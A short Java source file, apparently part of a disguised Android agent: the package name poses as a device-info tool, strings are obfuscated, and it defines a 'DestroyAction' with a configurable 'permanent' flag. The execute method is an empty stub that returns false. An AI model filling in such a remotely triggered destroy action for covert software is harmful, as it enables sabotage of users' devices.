package com.android.deviceinfo.action;

import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.m.M;

public class DestroyAction extends SubAction {

	private boolean permanent;

	public DestroyAction(ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(ConfAction conf) {
		  try {
	            permanent = conf.getBoolean(M.e("permanent"));
	        } catch (ConfigurationException e) {
	            return false;
	        }
	        return true;
	}

	@Override
	public boolean execute(Trigger trigger) {
		// TODO Auto-generated method stub
		return false;
	}

}
